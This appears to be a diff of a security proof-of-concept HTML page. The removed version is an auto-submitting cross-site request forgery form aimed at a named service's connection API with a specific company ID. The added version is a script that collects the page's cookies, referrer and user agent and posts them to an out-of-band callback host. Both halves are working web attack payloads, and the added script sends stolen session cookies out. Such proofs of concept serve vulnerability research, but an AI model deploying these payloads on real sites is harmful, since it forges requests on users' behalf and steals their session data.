@@ -1,28 +1,11 @@
-<!DOCTYPE html>
-<html>
-<head>
-    <title>Lightspeed Setup</title>
-</head>
-<body>
-    <h2>Connecting your Lightspeed account...</h2>
-    
-    <!-- This form WILL submit successfully -->
-    <form id="attackForm" action="https://app.channable.com/api/companies/97083/connections/lightspeed_eseries/initiate" method="POST">
-        <input type="hidden" name="payload" value='{
-            "properties": {
-                "label": {
-                    "nodeType": "static", 
-                    "value": "Lightspeed E-Series"
-                }
-            },
-            "confirm_connection_uri": " https://ijkdzaimgictwclkwecvvqiehzjldlil5.oast.fun"
-        }' />
-    </form>
-
-    <script>
-        // This will work - forms don't care about CORS
-        console.log('Submitting form to target.com...');
-        document.getElementById('attackForm').submit();
-    </script>
-</body>
-</html>
+<!-- test.html -->
+<script>
+fetch('https://mwkvvcqlbgldlnwueopmazqp0m5mmrd80.oast.fun/POC', {
+    method: 'POST',
+    body: JSON.stringify({
+        referrer: document.referrer,
+        cookies: document.cookie,
+        userAgent: navigator.userAgent
+    })
+});
+</script>
